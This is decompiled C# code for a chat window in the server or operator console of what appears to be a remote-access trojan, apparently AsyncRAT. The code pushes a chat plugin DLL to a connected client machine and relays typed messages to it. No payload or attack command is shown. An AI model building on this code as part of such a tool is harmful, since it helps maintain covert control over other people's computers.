using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000086 RID: 134
	public partial class FormChat : Form
	{
		// Token: 0x170000BF RID: 191
		// (get) Token: 0x06000353 RID: 851 RVA: 0x00003E21 File Offset: 0x00002021
		// (set) Token: 0x06000354 RID: 852 RVA: 0x00003E29 File Offset: 0x00002029
		public Form1 F { get; set; }

		// Token: 0x170000C0 RID: 192
		// (get) Token: 0x06000355 RID: 853 RVA: 0x00003E32 File Offset: 0x00002032
		// (set) Token: 0x06000356 RID: 854 RVA: 0x00003E3A File Offset: 0x0000203A
		internal Clients ParentClient { get; set; }

		// Token: 0x170000C1 RID: 193
		// (get) Token: 0x06000357 RID: 855 RVA: 0x00003E43 File Offset: 0x00002043
		// (set) Token: 0x06000358 RID: 856 RVA: 0x00003E4B File Offset: 0x0000204B
		internal Clients Client { get; set; }

		// Token: 0x06000359 RID: 857 RVA: 0x00003E54 File Offset: 0x00002054
		public FormChat()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600035A RID: 858 RVA: 0x00028930 File Offset: 0x00026B30
		private void TextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.textBox1.Enabled && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.textBox1.Text))
			{
				this.richTextBox1.AppendText("ME: " + this.textBox1.Text + Environment.NewLine);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "chatWriteInput";
				msgPack.ForcePathObject("Input").AsString = this.Nickname + ": " + this.textBox1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.textBox1.Clear();
			}
		}

		// Token: 0x0600035B RID: 859 RVA: 0x00028A04 File Offset: 0x00026C04
		private void FormChat_Load(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("TYPE YOUR NICKNAME", "CHAT", "Admin", -1, -1);
			if (string.IsNullOrEmpty(text))
			{
				base.Close();
				return;
			}
			this.Nickname = text;
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "plugin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Chat.dll");
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.ParentClient.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600035C RID: 860 RVA: 0x00028A90 File Offset: 0x00026C90
		private void FormChat_FormClosed(object sender, FormClosedEventArgs e)
		{
			if (this.Client != null)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "chatExit";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600035D RID: 861 RVA: 0x00028AF4 File Offset: 0x00026CF4
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400028C RID: 652
		private string Nickname = "Admin";
	}
}
